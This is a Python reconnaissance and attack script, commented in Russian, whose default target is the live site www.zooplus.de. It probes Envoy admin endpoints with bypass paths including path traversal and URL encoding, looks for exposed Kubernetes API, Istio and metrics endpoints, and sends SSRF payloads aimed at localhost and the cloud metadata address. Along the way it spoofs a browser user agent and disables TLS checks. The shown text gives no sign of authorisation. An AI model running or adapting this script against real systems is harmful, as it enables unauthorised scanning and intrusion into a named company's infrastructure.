#!/usr/bin/env python3
"""
Advanced Cluster Testing для Zooplus
Глубокое тестирование кластерной инфраструктуры с фокусом на Istio/Envoy
"""

import requests
import json
import sys
from urllib.parse import urljoin, urlparse
from datetime import datetime
import re
import base64

class AdvancedClusterTester:
    def __init__(self, target="www.zooplus.de"):
        self.target = target
        self.base_url = f"https://{target}"
        self.findings = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    def test_istio_headers(self):
        """Проверяет Istio-specific headers на утечки информации"""
        print("\n[*] Testing Istio headers for information disclosure...")
        
        try:
            resp = self.session.get(self.base_url, timeout=10, verify=False)
            headers = resp.headers
            
            # Istio/Envoy specific headers
            istio_headers = {
                'x-envoy-upstream-service-time': 'Upstream service response time',
                'x-envoy-decorator-operation': 'Service operation name',
                'x-istio-service-entry': 'Istio service entry',
                'x-envoy-peer-metadata': 'Peer metadata (base64 encoded)',
                'x-envoy-peer-metadata-id': 'Peer metadata ID',
                'server': 'Server header (istio-envoy)'
            }
            
            for header, description in istio_headers.items():
                if header in headers:
                    value = headers[header]
                    
                    # Try to decode base64 metadata
                    if 'metadata' in header.lower() and value:
                        try:
                            decoded = base64.b64decode(value).decode('utf-8', errors='ignore')
                            if len(decoded) > 10:  # Meaningful data
                                self.log_finding(
                                    "MEDIUM",
                                    f"Istio Header Information Disclosure: {header}",
                                    f"{description}. Value contains: {decoded[:100]}",
                                    evidence=f"Header: {header}, Decoded: {decoded[:200]}"
                                )
                        except:
                            pass
                    
                    # Check server header
                    if header == 'server' and 'istio' in value.lower():
                        self.log_finding(
                            "LOW",
                            "Istio Server Header Disclosure",
                            f"Server header reveals Istio usage: {value}",
                            evidence=value
                        )
        except Exception as e:
            print(f"    Error: {e}")
    
    def test_envoy_admin_bypass(self):
        """Проверяет обход защиты admin endpoints через различные пути"""
        print("\n[*] Testing Envoy admin endpoint bypass techniques...")
        
        bypass_paths = [
            "/stats",
            "/stats?format=json",
            "/stats?format=prometheus",
            "/admin/stats",
            "/_stats",
            "/envoy/stats",
            "/istio/stats",
            "/proxy/stats",
            "//stats",  # Double slash
            "/stats/",  # Trailing slash
            "/stats/../stats",  # Path traversal
            "/stats%2F",  # URL encoded
            "/stats;",  # Semicolon
            "/stats?",  # Query param
        ]
        
        for path in bypass_paths:
            try:
                url = urljoin(self.base_url, path)
                resp = self.session.get(url, timeout=5, verify=False, allow_redirects=False)
                
                # Check for Envoy stats format
                if resp.status_code == 200:
                    content = resp.text.lower()
                    if any(keyword in content for keyword in ['cluster', 'listener', 'http', 'tcp', 'upstream']):
                        self.log_finding(
                            "CRITICAL",
                            f"Envoy Admin Endpoint Accessible: {path}",
                            f"Envoy admin endpoint is accessible via path: {path}",
                            endpoint=url,
                            evidence=f"Status: {resp.status_code}, Contains Envoy data"
                        )
                        break  # Found one, no need to continue
            except:
                pass
    
    def test_kubernetes_api_paths(self):
        """Проверяет различные пути к Kubernetes API"""
        print("\n[*] Testing Kubernetes API paths...")
        
        k8s_paths = [
            "/api/v1",
            "/apis",
            "/apis/v1",
            "/k8s/api/v1",
            "/kubernetes/api/v1",
            "/kube/api/v1",
            "/api",
            "/version",
            "/healthz",
            "/readyz",
            "/livez"
        ]
        
        for path in k8s_paths:
            try:
                url = urljoin(self.base_url, path)
                resp = self.session.get(url, timeout=5, verify=False, allow_redirects=False)
                
                if resp.status_code == 200:
                    # Check if it looks like K8s API response
                    content = resp.text.lower()
                    if any(keyword in content for keyword in ['kind', 'apiversion', 'metadata', 'items', 'resources']):
                        self.log_finding(
                            "CRITICAL",
                            f"Kubernetes API Exposed: {path}",
                            f"Kubernetes API is accessible at: {path}",
                            endpoint=url,
                            evidence=f"Status: {resp.status_code}, Contains K8s API structure"
                        )
            except:
                pass
    
    def test_istio_virtual_service(self):
        """Проверяет доступность Istio VirtualService конфигурации"""
        print("\n[*] Testing Istio VirtualService exposure...")
        
        vs_paths = [
            "/.well-known/istio",
            "/istio/config",
            "/mesh/config",
            "/api/istio/config",
            "/config/istio"
        ]
        
        for path in vs_paths:
            try:
                url = urljoin(self.base_url, path)
                resp = self.session.get(url, timeout=5, verify=False)
                
                if resp.status_code == 200:
                    content = resp.text.lower()
                    if any(keyword in content for keyword in ['virtualservice', 'destinationrule', 'gateway', 'serviceentry']):
                        self.log_finding(
                            "HIGH",
                            f"Istio Config Exposed: {path}",
                            f"Istio configuration is accessible, revealing routing rules",
                            endpoint=url,
                            evidence="Contains Istio CRD definitions"
                        )
            except:
                pass
    
    def test_metrics_information_disclosure(self):
        """Проверяет metrics endpoints на утечки информации"""
        print("\n[*] Testing metrics endpoints...")
        
        metrics_paths = [
            "/metrics",
            "/prometheus",
            "/stats/prometheus",
            "/actuator/prometheus",
            "/api/metrics"
        ]
        
        for path in metrics_paths:
            try:
                url = urljoin(self.base_url, path)
                resp = self.session.get(url, timeout=5, verify=False)
                
                if resp.status_code == 200:
                    content = resp.text
                    
                    # Check for sensitive information
                    sensitive_patterns = {
                        'service_names': r'istio_service="([^"]+)"',
                        'pod_names': r'pod="([^"]+)"',
                        'namespace': r'namespace="([^"]+)"',
                        'cluster': r'cluster="([^"]+)"',
                        'version': r'version="([^"]+)"'
                    }
                    
                    found_info = {}
                    for info_type, pattern in sensitive_patterns.items():
                        matches = re.findall(pattern, content)
                        if matches:
                            found_info[info_type] = matches[:5]  # First 5 matches
                    
                    if found_info:
                        self.log_finding(
                            "MEDIUM",
                            f"Metrics Information Disclosure: {path}",
                            f"Metrics endpoint exposes sensitive information: {', '.join(found_info.keys())}",
                            endpoint=url,
                            evidence=str(found_info)
                        )
            except:
                pass
    
    def test_health_endpoint_details(self):
        """Детальная проверка health endpoints"""
        print("\n[*] Testing health endpoints in detail...")
        
        health_paths = ["/health", "/healthz", "/ready", "/readyz", "/live", "/livez"]
        
        for path in health_paths:
            try:
                url = urljoin(self.base_url, path)
                
                # Try different methods
                for method in ['GET', 'POST', 'OPTIONS']:
                    resp = self.session.request(method, url, timeout=5, verify=False)
                    
                    if resp.status_code == 200:
                        # Check response for information
                        content = resp.text.lower()
                        headers = resp.headers
                        
                        info_leaked = []
                        
                        # Check response body
                        if any(keyword in content for keyword in ['version', 'build', 'commit', 'hostname', 'pod', 'namespace']):
                            info_leaked.append("response_body")
                        
                        # Check headers
                        if 'x-version' in headers or 'x-build' in headers:
                            info_leaked.append("headers")
                        
                        if info_leaked:
                            self.log_finding(
                                "MEDIUM",
                                f"Health Endpoint Info Leak: {path} ({method})",
                                f"Health endpoint leaks information via: {', '.join(info_leaked)}",
                                endpoint=url,
                                evidence=resp.text[:200] if resp.text else str(headers)
                            )
            except:
                pass
    
    def test_ssrf_to_internal_services(self):
        """Тестирует SSRF векторы для доступа к внутренним сервисам кластера"""
        print("\n[*] Testing SSRF vectors to internal cluster services...")
        
        # Internal service IPs/ranges
        internal_targets = [
            "127.0.0.1",
            "localhost",
            "169.254.169.254",  # AWS metadata
            "10.0.0.1",
            "172.16.0.1",
            "192.168.1.1",
            "kubernetes.default.svc",
            "kubernetes.default.svc.cluster.local",
            "istio-pilot.istio-system.svc.cluster.local"
        ]
        
        # SSRF endpoints to test
        ssrf_endpoints = [
            "/api/fetch",
            "/api/proxy",
            "/api/request",
            "/api/url",
            "/api/import"
        ]
        
        for endpoint in ssrf_endpoints:
            for target in internal_targets[:3]:  # Limit to first 3 for speed
                try:
                    url = urljoin(self.base_url, endpoint)
                    payload = {"url": f"http://{target}"}
                    resp = self.session.post(url, json=payload, timeout=3, verify=False)
                    
                    if resp.status_code in [200, 400, 500]:  # Any response is interesting
                        # Check if we got internal service response
                        if target in resp.text or len(resp.text) > 100:
                            self.log_finding(
                                "HIGH",
                                f"SSRF to Internal Service: {endpoint}",
                                f"SSRF endpoint allows access to internal service: {target}",
                                endpoint=url,
                                evidence=f"Target: {target}, Response length: {len(resp.text)}"
                            )
                except:
                    pass
    
    def test_jwt_in_headers(self):
        """Проверяет JWT токены в заголовках"""
        print("\n[*] Testing for JWT tokens in responses...")
        
        try:
            resp = self.session.get(self.base_url, timeout=10, verify=False)
            headers = resp.headers
            
            # Look for JWT-like tokens
            jwt_pattern = r'[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}'
            
            for header_name, header_value in headers.items():
                matches = re.findall(jwt_pattern, header_value)
                if matches:
                    self.log_finding(
                        "MEDIUM",
                        f"JWT Token in Header: {header_name}",
                        f"JWT-like token found in response header",
                        evidence=f"Header: {header_name}, Token: {matches[0][:50]}..."
                    )
        except:
            pass
    
    def log_finding(self, severity, title, description, endpoint=None, evidence=None):
        """Логирует находку"""
        finding = {
            "severity": severity,
            "title": title,
            "description": description,
            "endpoint": endpoint,
            "evidence": evidence,
            "timestamp": datetime.now().isoformat()
        }
        self.findings.append(finding)
        print(f"  [{severity}] {title}")
        if endpoint:
            print(f"      Endpoint: {endpoint}")
    
    def generate_report(self):
        """Генерирует отчет"""
        return {
            "target": self.target,
            "scan_date": datetime.now().isoformat(),
            "total_findings": len(self.findings),
            "findings_by_severity": {
                "CRITICAL": len([f for f in self.findings if f["severity"] == "CRITICAL"]),
                "HIGH": len([f for f in self.findings if f["severity"] == "HIGH"]),
                "MEDIUM": len([f for f in self.findings if f["severity"] == "MEDIUM"]),
                "LOW": len([f for f in self.findings if f["severity"] == "LOW"])
            },
            "findings": self.findings
        }

def main():
    tester = AdvancedClusterTester()
    
    print("=" * 70)
    print("ZOOPLUS ADVANCED CLUSTER TESTER")
    print("=" * 70)
    print(f"Target: {tester.target}")
    print(f"Start Time: {datetime.now()}")
    print("=" * 70)
    
    # Run tests
    tester.test_istio_headers()
    tester.test_envoy_admin_bypass()
    tester.test_kubernetes_api_paths()
    tester.test_istio_virtual_service()
    tester.test_metrics_information_disclosure()
    tester.test_health_endpoint_details()
    tester.test_ssrf_to_internal_services()
    tester.test_jwt_in_headers()
    
    # Generate report
    report = tester.generate_report()
    
    # Save
    import os
    os.makedirs("reports", exist_ok=True)
    with open("reports/advanced_cluster_test.json", "w") as f:
        json.dump(report, f, indent=2)
    
    print("\n" + "=" * 70)
    print("TEST SUMMARY")
    print("=" * 70)
    print(f"Total Findings: {report['total_findings']}")
    print(f"  CRITICAL: {report['findings_by_severity']['CRITICAL']}")
    print(f"  HIGH: {report['findings_by_severity']['HIGH']}")
    print(f"  MEDIUM: {report['findings_by_severity']['MEDIUM']}")
    print(f"  LOW: {report['findings_by_severity']['LOW']}")
    print(f"\n[+] Report saved to: reports/advanced_cluster_test.json")

if __name__ == "__main__":
    main()

